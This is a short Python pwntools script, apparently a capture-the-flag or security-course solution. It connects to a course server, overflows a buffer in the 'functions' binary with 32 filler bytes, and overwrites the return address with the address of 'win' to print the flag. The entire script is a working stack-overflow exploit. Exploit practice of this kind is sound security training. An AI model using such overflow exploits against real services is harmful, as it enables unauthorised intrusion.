from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25153

s = remote(SERVER, PORT, timeout=9999)

elf = ELF('./functions') 
address = elf.symbols['win']
s.recv(512)
s.sendline(b'1'*32 + p32(address))
time.sleep(1)
flag = s.recv(512).decode()
print(flag)
